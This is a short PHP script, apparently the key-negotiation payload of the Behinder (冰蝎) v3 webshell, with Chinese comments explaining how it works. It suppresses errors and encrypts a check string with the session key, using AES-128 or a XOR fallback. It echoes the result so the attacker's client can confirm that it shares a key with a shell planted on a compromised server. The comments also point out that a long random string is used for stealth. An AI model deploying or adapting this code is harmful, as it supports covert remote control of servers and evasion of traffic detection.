@error_reporting(0);
function main($content)
{
	$result = array();
    // 	base 64 encode
	$result["status"] = base64_encode("success");
	$result["msg"] = base64_encode($content);
	$key = $_SESSION['k'];
	echo encrypt(json_encode($result),$key);
}

function encrypt($data,$key)
{
	if(!extension_loaded('openssl'))
	{
        // XOR encrypt
		for($i=0;$i<strlen($data);$i++) {
			$data[$i] = $data[$i]^$key[$i+1&15];
		}
		return $data;
	}
	else
	{
		return openssl_encrypt($data, "AES128", $key);
	}
}
// 参数content是本次密钥协商的凭证，服务端会用之前提到写入冰蝎3PHP马AES/XOR加密content内容，以响应的形式返回客户端。
// 客户端再用协商的密钥解密响应包的body，若有content相同，就代表客户端服务端持有的密钥一致，就可以开始愉快地通信。
// 冰蝎3的content是3000字符以上的随机长度字符串，隐蔽性更好。
$content="Y3dDMXpSa2o3OURScHlpcWNMVGVnNEt2ZVUyckR3SkJkcnVZakx4aGRXVnY3MkhkdHBkcFdYMXpJYkRQWVRPWmNhUDRMelhLdVZtT0VHczhCdDdqbmZQME5vOFEyVDdzTTNhajVHZWp4a2FHRkxiSU1UT1U1a0VWeGJIbmRwTkluU3liTkRienQ2QURXbllqOVZRNzRkbktBaGJVeEt2azFvM3M2MWNJU1pMZk1vQWdjY2Z3QnhMRHR1TnlETldaamJKVE8yOTFsU2pvak5jOGdrT2pKYlFwMTIzZnhSUXRHVmhrY05hdmNPbzV5a2tVR2JWQ2s=";
$content=base64_decode($content);
main($content);